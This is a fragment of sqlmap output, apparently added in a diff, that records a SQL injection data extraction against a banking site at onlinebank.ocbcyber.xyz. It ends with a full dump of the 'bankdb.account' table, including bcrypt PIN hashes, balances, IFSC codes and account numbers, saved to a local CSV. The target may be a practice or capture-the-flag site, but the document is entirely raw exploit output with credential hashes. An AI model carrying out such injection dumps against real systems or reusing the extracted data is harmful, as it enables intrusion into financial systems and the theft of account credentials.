+[11:59:22] [INFO] retrieved: '$2a$12$YATYWMyMYsRhqnAMfqMaQOiCnAutHar1u4evzlEaTfeOHlFUlBiJy'
+[11:59:23] [INFO] retrieved: '2'
+[11:59:24] [INFO] retrieved: '42fffd'
+[11:59:25] [INFO] retrieved: ' '
+[11:59:26] [INFO] retrieved: 'Savings'
+[11:59:27] [INFO] retrieved: '11000'
+[11:59:28] [INFO] retrieved: 'NIT'
+[11:59:29] [INFO] retrieved: '3'
+[11:59:30] [INFO] retrieved: 'NIT001'
+[11:59:31] [INFO] retrieved: ' '
+[11:59:32] [INFO] retrieved: '3'
+[11:59:33] [INFO] retrieved: 'efdf1e'
+[11:59:34] [INFO] retrieved: ' '
+[11:59:35] [INFO] retrieved: 'Savings'
+[11:59:36] [INFO] retrieved: '0'
+[11:59:37] [INFO] retrieved: 'NIT'
+[11:59:38] [INFO] retrieved: '4'
+[11:59:39] [INFO] retrieved: 'NIT001'
+[11:59:40] [INFO] retrieved: ' '
+[11:59:41] [INFO] retrieved: '4'
+[11:59:42] [INFO] retrieved: 'a0b111'
+[11:59:43] [INFO] retrieved: ' '
+[11:59:44] [INFO] retrieved: 'Savings'
+[11:59:45] [INFO] retrieved: '0'
+[11:59:46] [INFO] retrieved: 'NIT'
+[11:59:47] [INFO] retrieved: '5'
+[11:59:48] [INFO] retrieved: 'NIT001'
+[11:59:49] [INFO] retrieved: ' '
+[11:59:50] [INFO] retrieved: '5'
+[11:59:51] [INFO] retrieved: '81b3fd'
+[11:59:52] [INFO] retrieved: ' '
+[11:59:53] [INFO] retrieved: 'Savings'
+[11:59:54] [INFO] retrieved: '0'
+[11:59:55] [INFO] retrieved: 'NIT'
+[11:59:56] [INFO] retrieved: '6'
+[11:59:57] [INFO] retrieved: 'NIT001'
+[11:59:58] [INFO] retrieved: ' '
+[11:59:59] [INFO] retrieved: '6'
+Database: bankdb
+Table: account
+[6 entries]
++----+---------+--------------------------------------------------------------+--------+---------+-----------+--------------+----------------+----------------+
+| id | user_id | pin                                                          | branch | balance | ifsc_code | account_type | account_number | account_status |
++----+---------+--------------------------------------------------------------+--------+---------+-----------+--------------+----------------+----------------+
+| 1  | 1       | $2a$12$dNIRGeS3hZkCrRAWwWu/IO8/d4uDsm4mTna4qks9DYwMkWKV9gyMa | NIT    | 92100   | NIT001    | Savings      | 9a9df6         | NULL           |
+| 2  | 2       | $2a$12$YATYWMyMYsRhqnAMfqMaQOiCnAutHar1u4evzlEaTfeOHlFUlBiJy | NIT    | 0       | NIT001    | Savings      | f45660         | NULL           |
+| 3  | 3       | NULL                                                         | NIT    | 11000   | NIT001    | Savings      | 42fffd         | NULL           |
+| 4  | 4       | NULL                                                         | NIT    | 0       | NIT001    | Savings      | efdf1e         | NULL           |
+| 5  | 5       | NULL                                                         | NIT    | 0       | NIT001    | Savings      | a0b111         | NULL           |
+| 6  | 6       | NULL                                                         | NIT    | 0       | NIT001    | Savings      | 81b3fd         | NULL           |
++----+---------+--------------------------------------------------------------+--------+---------+-----------+--------------+----------------+----------------+
+
+[11:59:59] [INFO] table 'bankdb.`account`' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/account.csv'
+[11:59:59] [INFO] fetched data logged to text files under '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz'
+
+[*] ending @ 11:59:59 /2024-07-29/
+
+
